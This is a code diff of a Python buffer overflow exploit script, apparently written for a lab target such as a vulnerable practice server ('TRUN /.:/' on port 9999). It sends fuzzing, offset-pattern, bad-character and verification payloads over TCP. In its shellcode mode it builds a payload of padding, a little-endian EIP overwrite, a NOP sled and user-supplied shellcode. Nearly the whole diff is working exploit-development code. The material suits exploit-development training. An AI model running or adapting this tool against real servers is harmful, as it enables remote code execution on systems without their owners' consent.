@@ -5,7 +5,7 @@ A dumb buffer overflow script that fuzzes target server:
 
 Usage:
 - Fuzz:
-    python .\main.py --target 192.168.217.133 --port 9999 --command "TRUN /.:/"  --mode fuzz
+    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode fuzz
 
 - Offset + EIP:
     python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode offset --length 2400
@@ -81,8 +81,7 @@ def generate_unique_pattern(length) -> str:
 
 class Chunk_type(Enum):
     UTF = 1
-    RAW_STR = 2
-    BYTEARRAY = 3
+    BYTE = 2
 
 
 # Send a chunk of unique pattern'd data to target server
@@ -90,19 +89,17 @@ def send_chunk(target: str, port: int, command_prefix: str, sequence, type: Chun
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         sock.connect((target, port))
         print("send %s bytes" % len(sequence))
-        # Bad Character needs to be sent raw, otherwise there will be C0 characters
-        # However, other payloads need to be encoded to utf-8 otherwise EIP value will be wrong
-        # This might have something to do with Little Endian
-        if type == Chunk_type.RAW_STR:
-            payload = bytes(command_prefix + sequence, "raw_unicode_escape")
-            print("raw_str")
-            sock.send(payload)
-        elif type == Chunk_type.UTF:
+        # Bad Character needs to be sent as bytes, utf-8 encoding will result in random C0 characters
+        #   in between
+        # However, some other payloads need to be encoded to utf-8 otherwise EIP value will be wrong
+        # which might have something to do with Little Endian
+        if type == Chunk_type.UTF:
             print("utf-8")
             sock.send((command_prefix + sequence).encode("utf-8"))
-        elif type == Chunk_type.BYTEARRAY:
+        elif type == Chunk_type.BYTE:
+            # Payload passed in is suffix bytes
             print("byte array")
-            payload = bytearray(command_prefix, "utf-8")
+            payload = bytearray(command_prefix, "raw_unicode_escape")
             payload.extend(sequence)
             print(payload)
             sock.send((payload))
@@ -170,15 +167,16 @@ elif mode == "badchar":
     # Generate 0x01 to 0xff into a string
     badchars = "".join([chr(h) for h in range(1, 256)])
     # As the stack size might be limited, we place this full set of bad characters inside heap
-    payload = args.length * "A" + "B" * 4 + badchars
+    payload = bytes(args.length * "A" + "B" * 4 +
+                    badchars, "raw_unicode_escape")
     # print("sending bad character test payload:", payload)
     send_chunk(args.target, args.port, args.prefix,
-               payload, Chunk_type.RAW_STR)
+               payload, Chunk_type.BYTE)
 
 elif mode == "verify":
-    payload = args.length * "A" + "DEFG"
+    payload = bytes(args.length * "A" + "DEFG", "raw_unicode_escape")
     send_chunk(args.target, args.port, args.prefix,
-               payload, Chunk_type.RAW_STR)
+               payload, Chunk_type.BYTE)
 
 
 elif mode == "shellcode":
@@ -190,18 +188,16 @@ elif mode == "shellcode":
     shellcodes_hex = list(filter(lambda c: len(c) > 0, [
         c for c in shellcode_str.split("\\x")]))
 
-    # Convert EIP input to Little Endian
-    eip_le = bytearray.fromhex(args.eip)[::-1]
-
     payload = bytearray(args.length * "A", "raw_unicode_escape")
-    payload.extend(eip_le)
-    payload.extend(bytearray("\x90" * 50, "raw_unicode_escape"))
+    # Convert EIP input to Little Endian
+    payload.extend(bytearray.fromhex(args.eip)[::-1])
+    payload.extend(bytes("\x90" * 50, "raw_unicode_escape"))
 
     for h in shellcodes_hex:
         payload.extend(bytearray.fromhex(h))
 
     send_chunk(args.target, args.port, args.prefix,
-               payload, Chunk_type.BYTEARRAY)
+               payload, Chunk_type.BYTE)
 
 else:
     print("[ERROR] attack mode invalid")
